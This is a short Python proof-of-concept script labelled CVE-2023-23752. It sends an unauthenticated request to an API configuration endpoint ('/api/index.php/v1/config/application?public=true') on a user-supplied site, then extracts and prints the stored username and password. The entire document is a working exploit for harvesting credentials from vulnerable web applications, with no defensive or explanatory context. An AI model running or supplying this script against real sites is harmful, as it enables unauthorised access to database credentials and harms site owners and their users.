#POC - CVE-2023-23752

import requests
import json

def getValue(json,value):
	for item in js['data']:
		val = item['attributes'].get(value)
		if val is not None:
			return val



while True:
	host = input('Type URL (format : http://website.com) : ')
	vul_part = '/api/index.php/v1/config/application?public=true'
	link = host + vul_part

	req = requests.get(link)
	if req.status_code == 200:
		js = json.loads(req.text)
		user = getValue(js,'user')
		password = getValue(js,'password')
		print(f"Username : {user}, password : {password}")
	else:
		print(f"Request status code : {req.status_code}. WEBsite is not available")
	exit()
